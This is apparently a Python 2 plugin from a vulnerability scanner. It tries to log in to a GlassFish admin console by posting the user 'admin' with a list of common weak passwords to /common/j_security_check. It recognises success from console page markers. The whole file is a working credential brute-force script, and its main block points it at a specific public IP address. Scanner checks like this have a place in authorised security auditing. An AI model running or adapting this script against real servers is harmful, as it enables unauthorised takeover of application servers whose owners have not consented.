#coding:utf-8
from t import T
import urllib2


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        error_i=0
        flag_list=['Just refresh the page... login will take over','GlassFish Console - Common Tasks','/resource/common/js/adminjsf.js">','Admin Console</title>','src="/homePage.jsf"','src="/header.jsf"','<title>Common Tasks</title>','title="Logout from GlassFish']
        user_list=['admin']
        pass_list=['adminadmin','admin','glassfish','password','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','manager','root']
        res=None
        res_html=None
        for user in user_list:
            for password in pass_list:
                try:
                    PostStr='j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true'%(user,password)
                    print PostStr
                    request = urllib2.Request(target_url+'/common/j_security_check',PostStr)
                    res = urllib2.urlopen(request,timeout=timeout)
                    res_html = res.read()
                except urllib2.HTTPError,e:
                    return result
                except urllib2.URLError,e:
                    error_i+=1
                    if error_i >= 3:
                        return result
                    continue
                except:

                    break
                finally:
                    if res is not None:
                        res.close()
                        del res
                for flag in flag_list:
                    if flag in res_html:
                        info = '%s/common GlassFish Weak password %s:%s'%(target_url,user,password)

                        result['result']=True
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['type']='GlassFish Weak password'
                        result['VerifyInfo']['URL'] =target_url
                        result['VerifyInfo']['payload']=target_url+'/common/j_security_check'
                        result['VerifyInfo']['result'] =info
                        result['VerifyInfo']['level'] = 'hole'
                        return result

        return result

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')       